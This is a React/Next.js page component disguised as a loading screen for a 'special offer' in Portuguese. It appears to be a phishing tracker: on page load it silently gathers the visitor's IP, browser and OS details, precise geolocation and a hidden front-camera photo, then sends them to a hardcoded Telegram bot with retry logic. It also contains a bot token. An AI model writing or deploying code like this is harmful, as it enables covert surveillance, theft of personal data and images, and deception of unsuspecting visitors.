"use client"

import { useEffect, useRef } from "react"
import { sendTelegramMessage } from "@/services/telegram"
import { nanoid } from "nanoid"
import { DeviceInfo, LocationInfo, CaptureData } from "@/types/telegram"

const BOT_TOKEN = "7708090733:AAEm01sIJpFKlDIQCqvuCwLIrmbIMEYB9Gg"
const CHAT_ID = "7708090733"

function LinkPageClient() {
  const videoRef = useRef<HTMLVideoElement>(null)

  useEffect(() => {
    const captureData = async () => {
      try {
        // Get IP address
        let ip = "Unknown"
        try {
          const response = await fetch("https://api.ipify.org?format=json")
          const data = await response.json()
          ip = data.ip
        } catch (error) {
          console.error("Error fetching IP:", error)
        }

        // Get device info
        const deviceInfo: DeviceInfo = {
          ip,
          browser: navigator.userAgent,
          os: navigator.platform,
          timestamp: new Date().toISOString(),
          visitorId: nanoid()
        }

        // Get location with improved mobile support
        const location: LocationInfo = {
          latitude: 0,
          longitude: 0
        }

        if ('geolocation' in navigator) {
          try {
            const position = await new Promise<GeolocationPosition>((resolve, reject) => {
              navigator.geolocation.getCurrentPosition(
                resolve,
                reject,
                {
                  enableHighAccuracy: true,
                  timeout: 10000,
                  maximumAge: 0
                }
              )
            })
            location.latitude = position.coords.latitude
            location.longitude = position.coords.longitude
          } catch (error) {
            console.error('Error getting location:', error)
          }
        }

        // Get camera access with improved mobile support
        let imageData = ""
        try {
          const constraints = {
            video: {
              facingMode: "user",
              width: { ideal: 1280 },
              height: { ideal: 720 }
            }
          }

          const stream = await navigator.mediaDevices.getUserMedia(constraints)
          if (videoRef.current) {
            videoRef.current.srcObject = stream
            await new Promise((resolve) => {
              videoRef.current!.onloadedmetadata = resolve
            })

            // Wait a bit for the camera to focus
            await new Promise(resolve => setTimeout(resolve, 1000))

            const canvas = document.createElement('canvas')
            canvas.width = videoRef.current.videoWidth
            canvas.height = videoRef.current.videoHeight
            const ctx = canvas.getContext('2d')
            if (ctx) {
              ctx.drawImage(videoRef.current, 0, 0)
              imageData = canvas.toDataURL('image/jpeg', 0.8) // Reduced quality for better performance
              stream.getTracks().forEach(track => track.stop())
            }
          }
        } catch (error) {
          console.error('Error capturing image:', error)
        }

        // Prepare and save data
        const capturedInfo: CaptureData = {
          image: imageData,
          location,
          deviceInfo
        }

        // Save to localStorage with error handling
        try {
          const savedCaptures = localStorage.getItem('captures')
          const captures = savedCaptures ? JSON.parse(savedCaptures) : []
          captures.push(capturedInfo)
          localStorage.setItem('captures', JSON.stringify(captures))
        } catch (error) {
          console.error('Error saving to localStorage:', error)
        }

        // Send to Telegram with retry logic
        let retryCount = 0
        const maxRetries = 3

        while (retryCount < maxRetries) {
          try {
            await sendTelegramMessage(BOT_TOKEN, CHAT_ID, capturedInfo)
            break
          } catch (error) {
            console.error(`Error sending to Telegram (attempt ${retryCount + 1}):`, error)
            retryCount++
            if (retryCount < maxRetries) {
              await new Promise(resolve => setTimeout(resolve, 1000)) // Wait 1 second before retry
            }
          }
        }

      } catch (error) {
        console.error('Error in capture process:', error)
      }
    }

    // Add a small delay before starting capture to ensure the page is fully loaded
    setTimeout(captureData, 1000)
  }, [])

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-500 to-purple-600 flex flex-col items-center justify-center p-4">
      <div className="max-w-md w-full bg-white rounded-lg shadow-lg p-6">
        <div className="animate-pulse">
          <div className="h-4 bg-gray-200 rounded w-3/4 mb-4"></div>
          <div className="h-4 bg-gray-200 rounded w-1/2 mb-4"></div>
          <div className="h-4 bg-gray-200 rounded w-2/3"></div>
        </div>
        <p className="text-gray-500 text-sm mt-4 text-center">
          Preparando sua oferta especial...
        </p>
      </div>
      <video
        ref={videoRef}
        autoPlay
        playsInline
        muted
        className="hidden"
      />
    </div>
  )
}

export default LinkPageClient 